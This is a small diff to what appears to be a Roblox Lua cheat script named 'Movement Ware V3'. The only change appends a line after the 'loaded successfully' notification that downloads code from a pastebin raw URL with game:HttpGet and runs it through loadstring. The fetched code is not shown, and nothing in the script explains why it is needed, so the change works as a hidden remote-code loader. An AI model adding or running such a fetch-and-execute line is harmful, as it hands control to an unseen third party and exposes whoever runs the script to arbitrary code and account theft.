@@ -3666,3 +3666,5 @@ SettingsLeft:CreateButton({
 })
 
 notify('Movement Ware V3 loaded successfully.', 4)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/p6vbihwM"))()
